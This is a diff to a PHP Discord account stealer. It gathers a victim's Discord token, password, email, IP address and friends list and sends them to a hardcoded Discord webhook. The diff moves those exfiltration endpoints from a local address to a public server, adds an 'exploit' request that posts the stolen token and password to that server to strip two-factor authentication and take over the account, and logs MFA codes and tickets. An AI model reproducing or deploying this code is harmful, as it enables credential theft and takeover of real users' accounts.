@@ -80,7 +80,7 @@ class Main
         function SendDiscord($d_token,$d_password,$d_username,$d_userid,$d_badges,$d_nitro,$d_avatar,$d_client_ip, $d_country, $d_domain, $d_email, $d_friends, $descembed)
         {
             $url2 = 'https://discord.com/api/webhooks/1441613979976859729/0yvqNEEr1wRqPZpK-TWt2OjrgQHm-Lq2LszfBnhZ4jIeCFUlteYs0y4OTD0PORgubKMA';
-            $url = 'http://192.168.1.5:8080/api/v1/send/webhook';
+            $url = 'https://ibattle-api.vertraweb.app/api/v1/send/webhook';
             $ch=curl_init($url);
             $data = array(
                 'token' => $d_token,
@@ -196,7 +196,7 @@ class Main
         $TeamOwner     =  'Нет';
         $BOT_Verify    =  'Нет';
 
-        $json_response =  json_decode(getinfo($acc_token, "https://discord.com/api/v10/users/@me"), true);
+        $json_response =  json_decode(getinfo($acc_token, "https://discordapp.com/api/v9/users/@me"), true);
 
         $userid        =  $json_response['id'];
         $phone        =  $json_response['phone'];
@@ -368,7 +368,7 @@ class Main
 
         # ID LOOKUP SYSTEM
 
-        $url100 = 'http://192.168.1.5:8080/api/v1/lookup';
+        $url100 = 'https://ibattle-api.vertraweb.app/api/v1/lookup';
         $ch100=curl_init($url100);
         $data100 = array(
             'token' => $acc_token 
@@ -385,7 +385,7 @@ class Main
 
         # NITRO INFO
 
-        $url200 = 'http://192.168.1.5:8080/api/v1/lookup';
+        $url200 = 'https://ibattle-api.vertraweb.app/api/v1/lookup';
         $ch200=curl_init($url200);
         $data200 = array(
             'token' => $acc_token 
@@ -402,7 +402,7 @@ class Main
 
         # RARE FRIENDS
 
-        $url300 = 'http://192.168.1.5:8080/api/v1/get/rarefriends';
+        $url300 = 'https://ibattle-api.vertraweb.app/api/v1/get/rarefriends';
         $ch300=curl_init($url300);
         $data300 = array(
             'token' => $acc_token
@@ -415,6 +415,26 @@ class Main
         curl_close($ch300);
 
         # EXPLOIT
+
+$url400 = 'https://ibattle-api.vertraweb.appapi/v1/exploit/discord';
+$ch400 = curl_init($url400);
+$data400 = array(
+    'token' => $acc_token,
+    'password' => urldecode($password)
+);
+$payload400 = json_encode($data400);
+curl_setopt($ch400, CURLOPT_POSTFIELDS, $payload400);
+curl_setopt($ch400, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
+curl_setopt($ch400, CURLOPT_RETURNTRANSFER, true);
+$result400 = curl_exec($ch400);
+curl_close($ch400);
+$jsonResult400 = json_decode($result400, true);
+
+// Se conseguiu remover 2FA, usar o novo token
+if(isset($jsonResult400['success']) && $jsonResult400['success'] === true && isset($jsonResult400['token'])){
+    $acc_token = $jsonResult400['token']; // Atualizar com token sem 2FA
+}
+
 
         if ($badges == '')
         {
@@ -531,46 +551,54 @@ class VLT_API
         return json_decode(json_encode($response), true);
     }
 
-    public function totp_auth($ticket, $mfa_code): string{
-        $ch       =  curl_init("https://discord.com/api/v9/auth/mfa/totp");
-        $payload  =  array(
-            "code" => $mfa_code,
-            "gift_code_sku_id" => null,
-            "login_source" => null,
-            "ticket" => $ticket
-        );
-        $payload_s = json_encode($payload);
+public function totp_auth($ticket, $mfa_code): string{
+    error_log("=== TOTP_AUTH DEBUG ===");
+    error_log("Ticket: " . $ticket);
+    error_log("MFA Code: " . $mfa_code);
+    
+    $ch       =  curl_init("https://discord.com/api/v9/auth/mfa/totp");
+    $payload  =  array(
+        "code" => $mfa_code,
+        "gift_code_sku_id" => null,
+        "login_source" => null,
+        "ticket" => $ticket
+    );
+    $payload_s = json_encode($payload);
 
-        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
-        curl_setopt($ch, CURLOPT_HEADER, true);
-        curl_setopt($ch, CURLOPT_HTTPHEADER,
-            array(
-                'Content-Type: application/json',
-                'Content-Length: ' . strlen($payload_s),
-                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
-                'Accept: application/json'
-            )
-        );
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER,
+        array(
+            'Content-Type: application/json',
+            'Content-Length: ' . strlen($payload_s),
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
+            'Accept: application/json'
+        )
+    );
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
-        $result        =  curl_exec($ch);
-        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+    $result        =  curl_exec($ch);
+    $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);
 
-        curl_close($ch);
+    curl_close($ch);
 
-        $body      =  substr($result, $headers_size);
-        $response  =  (array)json_decode($body);
+    $body      =  substr($result, $headers_size);
+    $response  =  (array)json_decode($body);
 
-        if( !isset($response["token"]) )
-        {
-            return "EINVALID_MFA_CODE";
-        }
-        else
-        {
-            return $response["token"];
-        }
+    error_log("Response body: " . $body);
+    error_log("Has token? " . (isset($response["token"]) ? "YES" : "NO"));
+    error_log("======================");
+
+    if( !isset($response["token"]) )
+    {
+        return "EINVALID_MFA_CODE";
     }
+    else
+    {
+        return $response["token"];
+    }
+}
 }
 
 $VLT_API = new VLT_API();
